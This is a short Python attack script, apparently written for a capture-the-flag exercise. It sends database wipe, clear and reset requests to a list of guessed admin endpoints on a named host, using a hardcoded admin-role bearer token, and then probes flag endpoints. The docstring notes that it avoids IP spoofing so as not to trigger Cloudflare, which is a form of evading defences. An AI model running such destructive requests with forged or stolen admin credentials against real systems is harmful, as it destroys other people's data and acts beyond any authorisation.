#!/usr/bin/env python3
"""
Clean database wipe without IP spoofing that triggers Cloudflare
"""

import requests
import json

base_url = "http://fresh-start-267.emergent.host"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTcyMWZjYzEtMTk5OS00NGViLWJjOTQtMDU0YjU4N2E2MDUzIiwiZW1haWwiOiJhZG1pbkBldGhhcmEuYWkiLCJuYW1lIjoiU3lzdGVtIEFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc3NTMzMTI2fQ.Lu6aYqa4j4EQHX463APGH0n73p_ziCQn3luWUSi-61U"

headers = {
    "Authorization": f"Bearer {token}",
}

print("="*70)
print("DATABASE WIPE - CLEAN REQUEST")
print("="*70)

# Try database wipe endpoints
wipe_endpoints = [
    ('POST', '/api/admin/database/wipe'),
    ('POST', '/api/admin/database/clear'),
    ('POST', '/api/admin/database/reset'),
    ('DELETE', '/api/admin/database'),
    ('POST', '/api/admin/wipe'),
    ('POST', '/api/admin/clear'),
    ('POST', '/api/admin/reset'),
]

print("\n[1] Attempting database wipe...")
for method, endpoint in wipe_endpoints:
    try:
        if method == 'POST':
            resp = requests.post(f"{base_url}{endpoint}", headers=headers, json={}, timeout=10)
        elif method == 'DELETE':
            resp = requests.delete(f"{base_url}{endpoint}", headers=headers, timeout=10)
        
        print(f"{method} {endpoint}: {resp.status_code}")
        
        if resp.status_code not in [404, 405, 403]:
            print(f"  Response: {resp.text[:300]}")
            
            # Check for flag
            if 'flag{' in resp.text.lower() or 'ethara{' in resp.text.lower():
                print(f"\n[!!!] FLAG FOUND!")
                print(resp.text)
                
    except Exception as e:
        print(f"{method} {endpoint}: Error - {e}")

# Check flag endpoints
print("\n[2] Checking flag endpoints...")
flag_endpoints = [
    '/api/flag',
    '/api/admin/flag',
    '/flag',
    '/admin/flag',
    '/api/success',
]

for endpoint in flag_endpoints:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
        print(f"GET {endpoint}: {resp.status_code}")
        
        if resp.status_code == 200:
            if 'flag{' in resp.text.lower() or 'ethara{' in resp.text.lower():
                print(f"  [!!!] FLAG FOUND!")
                print(f"  {resp.text[:500]}")
    except Exception as e:
        pass

print("\n" + "="*70)
